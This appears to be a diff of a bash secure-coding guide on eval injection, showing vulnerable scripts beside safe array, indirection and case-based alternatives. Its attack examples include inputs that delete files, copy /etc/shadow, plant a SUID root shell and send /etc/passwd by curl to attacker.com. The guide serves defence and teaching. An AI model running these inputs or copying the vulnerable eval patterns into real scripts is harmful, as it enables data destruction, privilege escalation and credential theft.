@@ -15,7 +15,7 @@
 
 `eval` takes a string, performs all expansions on it, then executes the result as a command.
 
-\`\`\`bash
+```bash
 # Basic eval behavior
 cmd='echo "Hello World"'
 eval "$cmd"  # Executes: echo "Hello World"
@@ -26,24 +26,24 @@ var='$(whoami)'
 eval "echo $var"  # First expansion: echo $(whoami)
                    # Second expansion: executes whoami command!
 # Output: username
-\`\`\`
+```
 
 **Attack Example 1: Direct Command Injection**
 
-\`\`\`bash
+```bash
 # Vulnerable script - NEVER DO THIS!
 #!/bin/bash
 set -euo pipefail
 
 # Script allows user to set a variable
-user_input="$1"
+user_input=$1
 
 # Dangerous: eval executes arbitrary code
 eval "$user_input"
-\`\`\`
+```
 
 **Attack:**
-\`\`\`bash
+```bash
 # Attacker provides malicious input
 ./vulnerable-script.sh 'rm -rf /tmp/*'
 # Executes: rm -rf /tmp/*
@@ -56,27 +56,27 @@ eval "$user_input"
 
 # Or create SUID shell
 ./vulnerable-script.sh 'cp /bin/bash /tmp/rootshell; chmod u+s /tmp/rootshell'
-\`\`\`
+```
 
 **Attack Example 2: Variable Name Injection**
 
-\`\`\`bash
+```bash
 # Vulnerable script - seems safe but isn't!
 #!/bin/bash
 set -euo pipefail
 
 # User provides variable name and value
-var_name="$1"
-var_value="$2"
+var_name=$1
+var_value=$2
 
 # Attempt to set variable dynamically - DANGEROUS!
 eval "$var_name='$var_value'"
 
 echo "Variable $var_name has been set"
-\`\`\`
+```
 
 **Attack:**
-\`\`\`bash
+```bash
 # Attacker injects command via variable name
 ./vulnerable-script.sh 'x=$(rm -rf /important/data)' 'ignored'
 
@@ -89,17 +89,17 @@ echo "Variable $var_name has been set"
 # The eval executes:
 # x='$(cat /etc/shadow > /tmp/stolen)'
 # Command substitution runs with script privileges!
-\`\`\`
+```
 
 **Attack Example 3: Escaped Character Bypass**
 
-\`\`\`bash
+```bash
 # Vulnerable script - attempts sanitization
 #!/bin/bash
 set -euo pipefail
 
 # User input for calculation
-user_expr="$1"
+user_expr=$1
 
 # Attempt to sanitize - INSUFFICIENT!
 sanitized="${user_expr//[^0-9+\\-*\\/]/}"  # Allow only digits and operators
@@ -107,24 +107,24 @@ sanitized="${user_expr//[^0-9+\\-*\\/]/}"  # Allow only digits and operators
 # Still dangerous!
 eval "result=$sanitized"
 echo "Result: $result"
-\`\`\`
+```
 
 **Attack:**
-\`\`\`bash
+```bash
 # Attacker uses allowed characters maliciously
 ./vulnerable-script.sh '1+1)); curl https://attacker.com/steal?data=$(cat /etc/passwd); echo $((1'
 
 # Or uses integer assignment to overwrite critical variables
 ./vulnerable-script.sh 'PATH=0'
 # Now PATH is set to 0, breaking the script or enabling other attacks
-\`\`\`
+```
 
 **Attack Example 4: Log Injection via eval**
 
-\`\`\`bash
+```bash
 # Vulnerable logging function
 log_event() {
-  local -- event="$1"
+  local -- event=$1
   local -- timestamp
   timestamp=$(date '+%Y-%m-%d %H:%M:%S')
 
@@ -134,23 +134,23 @@ log_event() {
 }
 
 # Usage
-user_action="$1"
+user_action=$1
 log_event "$user_action"
-\`\`\`
+```
 
 **Attack:**
-\`\`\`bash
+```bash
 # Attacker injects command via event parameter
 ./vulnerable-script.sh 'login"; cat /etc/shadow > /tmp/pwned; echo "'
 
 # The eval executes:
 # echo "2025-01-15 10:30:00 - Event: login"; cat /etc/shadow > /tmp/pwned; echo "" >> /var/log/app.log
 # Three commands execute: echo, cat (malicious), echo
-\`\`\`
+```
 
 **Safe Alternative 1: Use Arrays for Command Construction**
 
-\`\`\`bash
+```bash
 # ✓ Correct - build command safely with array
 build_find_command() {
   local -- search_path="$1"
@@ -168,11 +168,11 @@ build_find_command() {
 build_find_command '/var/data' '*.txt'
 
 # Array preserves exact arguments, no injection possible
-\`\`\`
+```
 
 **Safe Alternative 2: Use Indirect Expansion for Variable References**
 
-\`\`\`bash
+```bash
 # ✗ Wrong - using eval for variable indirection
 var_name='HOME'
 eval "value=\\$$var_name"  # Gets value of $HOME
@@ -187,11 +187,11 @@ var_name='MY_VAR'
 value='Hello World'
 printf -v "$var_name" '%s' "$value"  # Assigns to MY_VAR safely
 echo "${!var_name}"  # Access value
-\`\`\`
+```
 
 **Safe Alternative 3: Use Associative Arrays for Dynamic Data**
 
-\`\`\`bash
+```bash
 # ✗ Wrong - using eval to create dynamic variables
 for i in {1..5}; do
   eval "var_$i='value $i'"  # Creates var_1, var_2, etc.
@@ -205,13 +205,13 @@ done
 
 # Access values
 echo "${data[var_3]}"  # value 3
-\`\`\`
+```
 
 **Safe Alternative 4: Use Functions Instead of Dynamic Code**
 
-\`\`\`bash
+```bash
 # ✗ Wrong - eval to select function dynamically
-action="$1"
+action=$1
 eval "${action}_function"  # If action='malicious', dangerous!
 
 # ✓ Correct - use case statement
@@ -220,7 +220,7 @@ case "$action" in
   stop)    stop_function ;;
   restart) restart_function ;;
   status)  status_function ;;
-  *)       die 22 "Invalid action: $action" ;;
+  *)       die 22 "Invalid action ${action@Q}" ;;
 esac
 
 # ✓ Also correct - use array of function names
@@ -234,13 +234,13 @@ declare -A actions=(
 if [[ -v "actions[$action]" ]]; then
   "${actions[$action]}"
 else
-  die 22 "Invalid action: $action"
+  die 22 "Invalid action ${action@Q}"
 fi
-\`\`\`
+```
 
 **Safe Alternative 5: Use Command Substitution for Output Capture**
 
-\`\`\`bash
+```bash
 # ✗ Wrong - eval for command output
 cmd='ls -la /tmp'
 eval "output=\$($cmd)"  # Dangerous!
@@ -251,11 +251,11 @@ output=$(ls -la /tmp)
 # ✓ Correct - if command is in variable, use array
 declare -a cmd=(ls -la /tmp)
 output=$("${cmd[@]}")
-\`\`\`
+```
 
 **Safe Alternative 6: Use read for Parsing**
 
-\`\`\`bash
+```bash
 # ✗ Wrong - eval for parsing key=value pairs
 config_line="PORT=8080"
 eval "$config_line"  # Sets PORT variable - DANGEROUS!
@@ -270,11 +270,11 @@ if [[ "$key" =~ ^[A-Z_][A-Z0-9_]*$ ]]; then
 else
   die 22 "Invalid configuration key: $key"
 fi
-\`\`\`
+```
 
 **Safe Alternative 7: Use Arithmetic Expansion for Math**
 
-\`\`\`bash
+```bash
 # ✗ Wrong - eval for arithmetic
 user_expr="$1"
 eval "result=$((user_expr))"  # Still risky!
@@ -288,13 +288,13 @@ fi
 
 # ✓ Better - use bc for complex math (isolates operations)
 result=$(bc <<< "$user_expr")
-\`\`\`
+```
 
 **Edge case: When eval seems necessary**
 
 **Scenario: Dynamic variable names in loops**
 
-\`\`\`bash
+```bash
 # Seems to need eval
 for service in nginx apache mysql; do
   eval "${service}_status=\$(systemctl is-active $service)"
@@ -305,11 +305,11 @@ declare -A service_status
 for service in nginx apache mysql; do
   service_status["$service"]=$(systemctl is-active "$service")
 done
-\`\`\`
+```
 
 **Scenario: Sourcing configuration with variable expansion**
 
-\`\`\`bash
+```bash
 # Config file contains: APP_DIR="$HOME/myapp"
 # Simple sourcing doesn't expand $HOME
 
@@ -331,11 +331,11 @@ if [[ -f config.txt && -r config.txt ]]; then
 else
   die 2 'Config file not found or not readable'
 fi
-\`\`\`
+```
 
 **Scenario: Building complex command with many options**
 
-\`\`\`bash
+```bash
 # Seems to need eval to build command string
 cmd="find /data -type f"
 [[ -n "$name_pattern" ]] && cmd="$cmd -name '$name_pattern'"
@@ -347,11 +347,11 @@ declare -a cmd=(find /data -type f)
 [[ -n "$name_pattern" ]] && cmd+=(-name "$name_pattern")
 [[ -n "$size" ]] && cmd+=(-size "$size")
 "${cmd[@]}"  # Safe execution
-\`\`\`
+```
 
 **The rare legitimate use of eval (with extreme caution):**
 
-\`\`\`bash
+```bash
 # Parsing output with known-safe format from trusted source
 # Example: getconf outputs shell variable assignments
 eval "$(getconf ARG_MAX)"  # Sets ARG_MAX variable
@@ -361,11 +361,11 @@ ARG_MAX=$(getconf ARG_MAX)
 
 # Another rare case: generating code from templates (development/build only)
 # NEVER in production with user input!
-\`\`\`
+```
 
 **Anti-patterns to avoid:**
 
-\`\`\`bash
+```bash
 # ✗ Wrong - eval with any user input
 eval "$user_command"
 
@@ -417,16 +417,16 @@ eval "echo \$$var_name"
 
 # ✓ Correct - indirect expansion
 echo "${!var_name}"
-\`\`\`
+```
 
 **Complete safe example (no eval):**
 
-\`\`\`bash
+```bash
 #!/bin/bash
 set -euo pipefail
 shopt -s inherit_errexit shift_verbose extglob nullglob
 
-declare -r VERSION='1.0.0'
+declare -r VERSION=1.0.0
 #shellcheck disable=SC2155
 declare -r SCRIPT_PATH=$(realpath -- "$0")
 declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}
@@ -468,7 +468,7 @@ status_service() {
 
 # Build command dynamically with array (no eval)
 build_curl_command() {
-  local -- url="$1"
+  local -- url=$1
   local -a curl_cmd=(curl)
 
   # Add options based on configuration
@@ -483,7 +483,7 @@ build_curl_command() {
 }
 
 main() {
-  local -- action="${1:-status}"
+  local -- action=${1:-status}
 
   # Dispatch to function (no eval)
   if [[ -v "actions[$action]" ]]; then
@@ -496,11 +496,11 @@ main() {
 main "$@"
 
 #fin
-\`\`\`
+```
 
 **Detecting eval usage:**
 
-\`\`\`bash
+```bash
 # Find all eval usage in scripts
 grep -rn 'eval' /path/to/scripts/
 
@@ -510,11 +510,11 @@ grep -rn 'eval.*\$' /path/to/scripts/
 # ShellCheck will warn about eval
 shellcheck -x script.sh
 # SC2086: eval should not be used for variable expansion
-\`\`\`
+```
 
 **Testing for eval vulnerabilities:**
 
-\`\`\`bash
+```bash
 # Test script with malicious input
 test_eval_safety() {
   local -- malicious_input='$(rm -rf /tmp/test_eval_*)'
@@ -538,7 +538,7 @@ test_eval_safety() {
   # Cleanup
   rm -rf /tmp/test_eval_target
 }
-\`\`\`
+```
 
 **Summary:**
 
